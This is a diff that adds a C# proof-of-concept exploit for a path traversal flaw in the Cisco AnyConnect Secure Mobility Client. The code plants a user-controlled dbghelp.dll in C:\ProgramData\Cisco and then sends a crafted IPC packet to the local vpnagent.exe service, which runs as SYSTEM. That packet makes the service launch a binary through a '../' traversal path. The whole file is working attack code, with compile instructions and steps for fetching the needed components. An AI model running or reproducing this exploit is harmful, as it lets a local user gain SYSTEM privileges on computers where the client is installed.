@@ -1,0 +1,111 @@
+// This is a proof of concept for a path traversal vulnerability in Cisco AnyConnect Secure Mobility Client.
+// Thanks to Yorick Koster for publishing details.
+//
+// Tested with Windows 7 and Windows 10 and AnyConnect version 4.5.x and 4.6.x.
+// For version 4.7.04x and 4.8.x you need to use -ipc=12345 in the CAC command.
+//
+// Compile with:
+// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:anypoc.exe anypoc.cs
+
+using System;
+using System.IO;
+using System.Net.Sockets;
+using System.Reflection;
+using System.Text;
+
+class MainClass {
+
+  static byte[] PackCommand(byte[] data) {
+    MemoryStream stm = new MemoryStream();
+    BinaryWriter writer = new BinaryWriter(stm);
+
+    // OCSC header
+    writer.Write(0x4353434f);
+    writer.Write((ushort)0x1A);
+    writer.Write((ushort)data.Length);
+    writer.Write(Guid.NewGuid().ToByteArray());
+    writer.Write((byte)1);
+    writer.Write((byte)2);
+    writer.Write(data);
+
+    return stm.ToArray();
+  }
+
+  static byte[] SwapShort(ushort s) {
+    byte[] bs = BitConverter.GetBytes(s);
+
+    byte tmp = bs[0];
+    bs[0] = bs[1];
+    bs[1] = tmp;
+
+    return bs;
+  }
+
+  static void PackString(BinaryWriter writer, int index, string s) {
+    writer.Write(SwapShort((ushort)index));
+    byte[] bs = Encoding.ASCII.GetBytes(s+"\0");
+    writer.Write(SwapShort((ushort)bs.Length));
+    writer.Write(bs);
+  }
+
+  static byte[] PackLaunchCommand(string path, string cmdline, string desktop, string relocateable_file_path) {
+    MemoryStream stm = new MemoryStream();
+    BinaryWriter writer = new BinaryWriter(stm);
+
+    PackString(writer, 1, path);
+    PackString(writer, 2, cmdline);
+    PackString(writer, 4, desktop);
+    PackString(writer, 6, relocateable_file_path);
+
+    return stm.ToArray();
+  }
+
+  public static void Main() {
+    try {
+
+      // check if C:\anyconnect\cstub.exe exists
+      if (File.Exists(@"C:\anyconnect\cstub.exe")) {
+        Console.WriteLine("cstub.exe found");
+      } else {
+        Console.WriteLine("The file \"cstub.exe\" could not be found !\n");
+        Console.WriteLine("1. search and download \"anyconnect-win-4.6.03049-predeploy-k9.zip\" from the internet");
+        Console.WriteLine("2. unzip anyconnect-win-4.6.03049-predeploy-k9.zip");
+        Console.WriteLine("3. download 7-zip_portable, https://portableapps.com/apps/utilities/7-zip_portable");
+        Console.WriteLine("4. extract anyconnect-win-4.6.03049-posture-predeploy-k9.msi with 7-zip_portable");
+        Console.WriteLine("5. copy cstub.exe to C:\\anyconnect\\");
+        Environment.Exit(1);
+      }
+
+      // copy the user controlled dll
+      File.Copy(@"C:\anyconnect\dbghelp.dll", @"C:\ProgramData\Cisco\dbghelp.dll", true);
+
+      byte[] data = PackCommand(PackLaunchCommand(
+
+        // path
+        @"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe",
+
+        // command line
+        "\"CAC-nc-install\tC:\\anyconnect\\1\\2\\3\\4\\../../../../cstub.exe\tX\tY\"",
+
+        // command line for version 4.7.04x and above
+        // "\"CAC-nc-install\t-ipc=12345\tC:\\anyconnect\\1\\2\\3\\4\\../../../../cstub.exe\tX\tY\"",
+
+        // desktop
+        @"WinSta0\Default",
+
+        // relocateable file path
+        @"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe"));
+
+      // send packet to vpnagent.exe which runs as SYSTEM
+      TcpClient client = new TcpClient("127.0.0.1", 62522);
+      NetworkStream stm = client.GetStream();
+      stm.ReadTimeout = 5000;
+      stm.Write(data, 0, data.Length);
+      stm.Flush();
+      stm.ReadByte();
+      client.Close();
+    } catch(Exception ex) {
+      Console.WriteLine(ex);
+    }
+  }
+}
